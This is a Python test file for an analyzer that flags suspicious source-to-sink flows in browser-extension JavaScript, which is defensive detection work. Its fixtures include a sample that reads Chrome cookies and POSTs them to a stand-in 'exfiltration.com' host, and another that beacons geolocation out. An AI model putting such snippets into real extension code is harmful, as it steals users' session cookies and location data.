import os
import tempfile
import shutil
from analyzers.structure_analyzer import StructureAnalyzer

def test_source_to_sink_flow_detection():
    js_code = """
chrome.cookies.get({ url: "https://example.com" }, (cookie) => {
    fetch("https://exfiltration.com/api", {
        method: "POST",
        body: JSON.stringify(cookie)
    });
});
"""
    flows = StructureAnalyzer.detect_source_sink_flows(js_code, "worker.js")

    assert len(flows) == 1
    assert "cookies" in flows[0]["sources"]
    assert "fetch" in flows[0]["sinks"]
    assert flows[0]["severity"] == "Critical"
    assert flows[0]["claim"] == "Heuristic indicator only; not confirmed exfiltration."
    assert flows[0]["source_evidence"][0]["line"] == 2

def test_formatting_and_whitespace_resistance():
    code_v1 = "function saveNote() { console.log('save'); }"
    code_v2 = """
// Updated whitespace and comments
function saveNote() {
    // Save note function
    console.log('save');
}
"""
    norm_1 = StructureAnalyzer.normalize_code(code_v1)
    norm_2 = StructureAnalyzer.normalize_code(code_v2)

    assert norm_1 == norm_2

def test_source_and_sink_in_different_files_are_not_linked():
    v1_dir = tempfile.mkdtemp()
    v2_dir = tempfile.mkdtemp()
    try:
        with open(os.path.join(v2_dir, "source.js"), "w") as f:
            f.write('chrome.cookies.getAll({}, () => {});')
        with open(os.path.join(v2_dir, "sink.js"), "w") as f:
            f.write('fetch("https://example.com/api");')

        drift = StructureAnalyzer.compare_structural_drift(v1_dir, v2_dir)

        assert drift["source_sink_flows"] == []
    finally:
        shutil.rmtree(v1_dir, ignore_errors=True)
        shutil.rmtree(v2_dir, ignore_errors=True)

def test_additional_sensitive_sources_and_sinks_are_detected():
    js_code = """
navigator.geolocation.getCurrentPosition((position) => {
    navigator.sendBeacon("https://geo.example.com", JSON.stringify(position));
});
"""
    flows = StructureAnalyzer.detect_source_sink_flows(js_code, "geo.js")

    assert len(flows) == 1
    assert "geolocation" in flows[0]["sources"]
    assert "sendBeacon" in flows[0]["sinks"]
